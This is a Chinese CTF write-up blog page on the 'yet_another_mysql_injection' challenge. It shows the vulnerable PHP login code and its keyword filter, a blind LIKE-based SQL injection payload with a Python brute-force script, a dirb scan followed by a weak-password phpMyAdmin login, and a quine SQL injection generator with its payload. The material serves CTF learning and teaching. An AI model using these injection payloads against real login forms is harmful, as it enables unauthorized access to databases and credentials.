@@ -1,0 +1,347 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>第五空间2021-yet_another_mysql_injection-wp | Antel0p3&#39;s blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="题目链接
+解法一页面源码源码提示  ?source&amp;#x3D;1 查看
+1&amp;lt;!-- /?source --&amp;gt;
+
+12345678910111213141516171819202122232425262728293031323334353637&amp;lt;?phpinclude_once(&amp;q">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="第五空间2021-yet_another_mysql_injection-wp"/>
+  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+					
+							<div class="page-header">
+								<h1>
+									
+											
+												第五空间2021-yet_another_mysql_injection-wp
+									
+									
+								</h1>
+								
+									<p id="/2023/07/12/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42021-yasqlin-wp/" class="leancloud-visitors view"
+										data-flag-title="第五空间2021-yet_another_mysql_injection-wp">
+										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+									</p>
+									
+							</div>
+							
+								
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta">
+		
+	</div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/334">题目链接</a></p>
+<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><h3 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h3><p>源码提示  ?source&#x3D;1 查看</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /?source --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="可见查询语句"><a href="#可见查询语句" class="headerlink" title="可见查询语句"></a>可见查询语句</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>过滤了空格和等号</li>
+<li>查询成功显示<code>wrong password</code> 失败显示 <code>something wrong</code></li>
+</ul>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>可以通过%通配符一位一位爆破</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[post] username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;/**/or/**/password/**/like/**/&#x27;</span>e<span class="operator">%</span><span class="string">&#x27;%23</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">alpha = string.hexdigits</span><br><span class="line">pswd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> alpha:</span><br><span class="line">        post_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;1&#x27;/**/or/**/password/**/like/**/&#x27;<span class="subst">&#123;pswd + i&#125;</span>%&#x27;#&quot;</span>&#125;</span><br><span class="line">        response = requests.post(<span class="string">&quot;http://node4.anna.nssctf.cn:28624/&quot;</span>, data=post_data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;something&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            pswd += i</span><br><span class="line">            <span class="built_in">print</span>(pswd)</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># eb2d018ac00e7d6dbe8eb7059df0a4b2</span></span><br><span class="line">post_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;pswd&#125;</span>&quot;</span>&#125;</span><br><span class="line">response = requests.post(<span class="string">&quot;http://node4.anna.nssctf.cn:28624/&quot;</span>, data=post_data)	<span class="comment"># 登入获取flag</span></span><br><span class="line"><span class="built_in">print</span>(response.text)	</span><br></pre></td></tr></table></figure>
+
+<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><h3 id="dirb后台爆破"><a href="#dirb后台爆破" class="headerlink" title="dirb后台爆破"></a>dirb后台爆破</h3><p>发现phpmyadmin</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; dirb [url]</span><br><span class="line">&lt; </span><br><span class="line">+ http://node4.anna.nssctf.cn:28632/index.php (CODE:200|SIZE:323)              </span><br><span class="line">==&gt; DIRECTORY: http://node4.anna.nssctf.cn:28632/phpmyadmin/</span><br></pre></td></tr></table></figure>
+
+<h3 id="访问phpmyadmin"><a href="#访问phpmyadmin" class="headerlink" title="访问phpmyadmin"></a>访问phpmyadmin</h3><ul>
+<li><p>发现是sql登录界面    弱口令admin admin登录成功</p>
+</li>
+<li><p>查看ctf数据库中users table   获取admin密码</p>
+</li>
+<li><p>登录获取flag</p>
+</li>
+</ul>
+<h2 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h2><h2 id="quine注入"><a href="#quine注入" class="headerlink" title="quine注入"></a>quine注入</h2><h3 id="quine注入：sql命令的输入和执行后的输出完全相同，以此通过-row-39-password-39-password"><a href="#quine注入：sql命令的输入和执行后的输出完全相同，以此通过-row-39-password-39-password" class="headerlink" title="quine注入：sql命令的输入和执行后的输出完全相同，以此通过 $row[&#39;password&#39;] === $password"></a>quine注入：sql命令的输入和执行后的输出完全相同，以此通过 <code>$row[&#39;password&#39;] === $password</code></h3><p><a target="_blank" rel="noopener" href="https://www.shysecurity.com/post/20140705-SQLi-Quine">https://www.shysecurity.com/post/20140705-SQLi-Quine</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253570">从三道赛题再谈Quine trick-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+<p>[Quine Injection](<a target="_blank" rel="noopener" href="https://goodlunatic.github.io/2023/07/04/Quine">https://goodlunatic.github.io/2023/07/04/Quine</a> Injection&#x2F;)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># quine 生成脚本</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quine</span>(<span class="params">data, debug=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug: <span class="built_in">print</span>(data)</span><br><span class="line">    data = data.replace(<span class="string">&#x27;!!&#x27;</span>,<span class="string">&quot;REPLACE(REPLACE(!!,CHAR(34),CHAR(39)),CHAR(33),!!)&quot;</span>)</span><br><span class="line">    blob = data.replace(<span class="string">&#x27;!!&#x27;</span>,<span class="string">&#x27;&quot;!&quot;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">    data = data.replace(<span class="string">&#x27;!!&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>+blob+<span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> debug: <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!填充的东西执行完之后和data一样</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">data=<span class="string">&quot;&#x27;/**/union/**/select(!!)#&quot;</span></span><br><span class="line">quine(data)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;/**/union/**/select(REPLACE(REPLACE(&#x27;</span>&quot;/**/union/**/select(REPLACE(REPLACE(&quot;<span class="operator">!</span>&quot;,CHAR(34),CHAR(39)),CHAR(33),&quot;<span class="operator">!</span>&quot;))#&#x27;,CHAR(34),CHAR(39)),CHAR(33),&#x27;&quot;<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>(REPLACE(REPLACE(&quot;!&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">33</span>),&quot;!&quot;))#<span class="string">&#x27;))#</span></span><br></pre></td></tr></table></figure>
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	<!-- 
+		<span id="/2023/07/12/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42021-yasqlin-wp/" class="leancloud-visitors view" data-flag-title="第五空间2021-yet_another_mysql_injection-wp">
+			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+		</span>
+	 -->
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/07/11/SWPUCTF2022-ezsql-wp/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"7m4bFydh606FgGbxRPsI8M6l-gzGzoHsz","appKey":"edXvAXhOXIvksZqtq8b5AXWj","placeholder":"input your comment: ","visitor":true,"avatar":"retro","lang":"en","metaPlaceholder":{"nick":"nick","mail":"mail","link":"link"},"requiredFields":["nick","mail","link"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "input your comment: ",
+    //     avatar:"retro",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail,link".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-07-12 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/web-wp/">web-wp<span>14</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>28</span></a></li> <li><a href="/tags/nssctf/">nssctf<span>22</span></a></li> <li><a href="/tags/web/">web<span>15</span></a></li> <li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>10</span></a></li> <li><a href="/tags/sql/">sql<span>4</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
